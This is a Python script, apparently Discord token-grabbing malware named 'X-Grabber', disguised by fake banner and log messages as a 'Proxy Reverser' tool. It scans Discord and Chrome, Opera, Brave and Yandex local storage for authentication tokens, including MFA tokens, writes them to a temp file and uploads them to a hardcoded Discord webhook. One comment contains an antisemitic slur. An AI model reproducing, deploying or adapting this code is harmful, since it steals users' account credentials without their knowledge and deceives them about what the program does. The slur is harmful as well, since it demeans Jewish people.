# Import modules

import os
import re
from discord_webhook import DiscordWebhook
import time

## Make colors work on jewdows
init(autoreset=True)


## Fake Message
print('[Log] | Starting Proxy Reverser v3.2')


## Your webhook Options
msg = '''diff
- XGV4 Exucuted.
'''
url = 'https://ptb.discordapp.com/api/webhooks/730462621077209088/RvyE1TJvRcepUwOaZKwKVl1xk9bj9CArgIDMUBP54XZVNDndc9qYF8jrwSuM2Fdw23ra'
webhook = DiscordWebhook(url=url, username="X-Grabber", content=msg)

## Roaming location
roaming = os.getenv('AppData')

## Output for txt file location
output = open(roaming + "temp.txt", "a")

roaming = os.getenv('AppData')

## Discord Locations
Directories = {
        'Discord': roaming + '\\Discord',
        'Discord Two': roaming + '\\discord',
        'Discord Canary': roaming + '\\Discordcanary',
        'Discord Canary Two': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
}


## Scan for the regex [\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}
def Yoink(Directory):
	Directory += '\\Local Storage\\leveldb'

	Tokens = []

	for FileName in os.listdir(Directory):
		if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for Token in re.findall(regex, line):
					Tokens.append(Token)

	return Tokens

## More webhook settings
def Send():
    with open(roaming + 'temp.txt', "rb") as f:
        webhook.add_file(file=f.read(), filename=f'tokens.txt')
    response = webhook.execute()

## Wipe the temp file
def Wipe():
    if os.path.exists(roaming + "temp.txt"):
      output2 = open(roaming + "temp.txt", "w")
      output2.write("")
      output2.close()
    else:
      pass

## Search Directorys for Token regex if exists
def Grabshit():
	for Discord, Directory in Directories.items():
		if os.path.exists(Directory):
			Tokens = Yoink(Directory)

		if len(Tokens) > 0:
			for Token in Tokens:
				output.write(f"{Token}\n")

Grabshit()
Send()
## Wipe() - Just wipes logs

## Fake Logs
print(Fore.RED + '[LOG] | Listening For Connections')

print(Fore.GREEN + '[LOG] | PSV3 Started\n')
print(Fore.GREEN + '_' * 50)
print(Fore.GREEN + '\nConnections : 0')
print(Fore.GREEN + '_' * 50)

x = input()
